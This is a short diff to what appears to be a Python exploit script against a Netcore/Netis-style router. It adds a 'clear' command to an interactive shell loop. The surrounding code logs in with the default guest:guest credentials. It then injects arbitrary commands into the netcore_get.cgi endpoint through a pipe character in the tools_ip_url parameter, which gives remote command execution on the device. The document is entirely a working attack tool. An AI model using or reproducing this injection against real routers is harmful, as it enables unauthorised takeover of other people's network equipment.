@@ -13,6 +13,7 @@
 import argparse
 import requests
 import re
+import os
 from requests.auth import HTTPBasicAuth
 
 def exploit(host):
@@ -45,6 +46,8 @@ def exploit(host):
                     continue
                 if cmd.lower() == "exit":
                     break
+                if cmd.lower() == "clear":
+                    os.system('clear')
                 results_page = "http://" + host + "/cgi-bin-igd/netcore_get.cgi"
                 cmd_data2 = "mode_name=netcore_set&tools_type=2&tools_ip_url=|"+cmd+"&tools_cmd=1&net_tools_set=1&wlan_idx_num=0"
                 req_payload2 = requests.post(vulnerable_page, data=cmd_data2, headers=headers_value, auth = HTTPBasicAuth("guest", "guest"))
